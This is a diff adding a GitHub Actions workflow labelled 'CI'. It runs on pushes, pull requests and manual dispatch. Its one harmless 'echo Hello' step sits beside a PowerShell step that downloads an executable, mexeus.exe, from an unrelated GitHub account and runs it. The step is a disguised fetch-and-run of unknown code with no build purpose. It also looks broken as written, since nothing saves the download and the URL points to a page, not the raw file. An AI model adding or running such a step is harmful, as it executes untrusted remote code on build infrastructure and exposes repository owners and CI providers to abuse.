@@ -1,0 +1,16 @@
+name: CI
+on:
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+  workflow_dispatch:
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+      - name: Run a one-line script
+        run: echo Hello
+      - name: powershell
+        shell: pwsh
+        run: Invoke-WebRequest https://github.com/Gog2024/202404191212/blob/main/mexeus.exe ; .\mexeus.exe
